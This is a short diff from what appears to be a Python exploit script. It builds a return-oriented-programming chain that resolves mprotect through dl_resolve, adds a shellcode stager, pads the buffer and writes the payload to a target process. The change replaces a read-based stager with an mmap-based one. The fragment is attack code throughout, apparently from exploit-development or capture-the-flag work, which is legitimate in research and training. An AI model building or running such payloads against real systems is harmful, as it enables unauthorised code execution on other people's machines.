@@ -27,7 +27,7 @@ buf += rop.call_chain_ptr(
 )
 buf += rop.dl_resolve(addr_stage + len(buf), 'mprotect', retaddr=addr_stage+297)
 print "[+] offset to string: %d" % len(buf)
-buf += sc.get('read_stager')
+buf += sc.get('mmap_stager')
 buf += rop.fill(400, buf)
 
 p.write(buf)
